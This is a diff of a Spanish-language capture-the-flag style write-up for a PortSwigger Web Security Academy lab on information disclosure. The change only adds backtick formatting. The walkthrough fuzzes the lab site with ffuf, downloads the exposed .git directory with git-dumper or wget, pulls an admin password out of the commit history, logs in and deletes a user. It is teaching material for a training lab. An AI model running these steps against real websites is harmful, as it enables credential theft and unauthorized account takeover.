@@ -24,21 +24,21 @@ image:
   
 ## Descripción
 
-Este laboratorio revela información sensible a través de su historial de control de versiones. Para resolver el laboratorio, `obtén la contraseña del usuario administrador`, luego `inicia sesión y elimina al usuario carlos`
+Este `laboratorio` `revela` información `sensible` a través de su `historial de control de versiones`. Para `resolver` el laboratorio, `obtén` la `contraseña` del `usuario administrador`, luego `inicia sesión` y `elimina` al `usuario` `carlos`
 
 ---
 
 ## Guía de information disclosure
 
-Antes de completar este laboratorio es recomendable leerse esta `guía de information disclosure` [https://justice-reaper.github.io/posts/Information-Disclosure-Guide/](https://justice-reaper.github.io/posts/Information-Disclosure-Guide/)
+`Antes` de `completar` este `laboratorio` es recomendable `leerse` esta `guía de information disclosure` [https://justice-reaper.github.io/posts/Information-Disclosure-Guide/](https://justice-reaper.github.io/posts/Information-Disclosure-Guide/)
 
 ## Resolución
 
-Al acceder a la web nos sale esto
+Al `acceder` a la `web` nos sale esto
 
 ![](/assets/img/Information-Disclosure-Lab-5/image_1.png)
 
-Fuzzeamos la web, además de hacerlo desde Burpsuite podemos usar herramientas como fuff desde consola
+`Fuzzeamos` la `web`, además de hacerlo desde `Burpsuite` podemos usar herramientas como `fuff` desde `consola`
 
 ```
 # ffuf -c -t 10 -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://0a09009203fe839383e93ca700bf000c.web-security-academy.net/FUZZ
@@ -75,19 +75,19 @@ admin                   [Status: 401, Size: 2617, Words: 1049, Lines: 54, Durati
 analytics               [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 52ms]
 ```
 
-Con `git-dumper` [https://github.com/arthaud/git-dumper.git](https://github.com/arthaud/git-dumper.git) podemos descargarnos todo el `.git/ y si queremos una alternativa con interfaz gráfica podemos usar git-cola` [https://github.com/git-cola/git-cola.git](https://github.com/git-cola/git-cola.git)
+Con `git-dumper` [https://github.com/arthaud/git-dumper.git](https://github.com/arthaud/git-dumper.git) podemos `descargarnos` todo el `.git/` y si queremos una alternativa con `interfaz gráfica` podemos usar `git-cola` [https://github.com/git-cola/git-cola.git](https://github.com/git-cola/git-cola.git)
 
 ```
 # git-dumper https://0a460009044cee648030a7e300300090.web-security-academy.net/.git/ project
 ```
 
-Otra alternativa sería descargarnos todo usando wget
+Otra alternativa sería `descargarnos` todo usando `wget`
 
 ```
 # wget -r https://0a460009044cee648030a7e300300090.web-security-academy.net/.git/
 ```
 
-Listamos los logs
+`Listamos` los `logs`
 
 ```
 # git log                                          
@@ -104,7 +104,7 @@ Date:   Mon Jun 22 16:23:42 2020 +0000
     Add skeleton admin panel
 ```
 
-Vemos el último commit y obtenemos una `contraseña`
+`Vemos` el `último commit` y `obtenemos` una `contraseña`
 
 ```
 # git show 0de9db705d356593125a122dd61dc2c5b4c059d6
@@ -123,10 +123,10 @@ index 26742e2..21d23f1 100644
 +ADMIN_PASSWORD=env('ADMIN_PASSWORD')
 ```
 
-Nos logueamos con las credenciales `administrator:z9xi7od0a1z0ar5c36jz`
+Nos `logueamos` con las credenciales `administrator:z9xi7od0a1z0ar5c36jz`
 
 ![](/assets/img/Information-Disclosure-Lab-5/image_2.png)
 
-Pulsamos sobre Admin panel y le borramos la cuenta al usuario carlos
+Pulsamos sobre `Admin panel` y le `borramos` la `cuenta` al usuario `carlos`
 
 ![](/assets/img/Information-Disclosure-Lab-5/image_3.png)
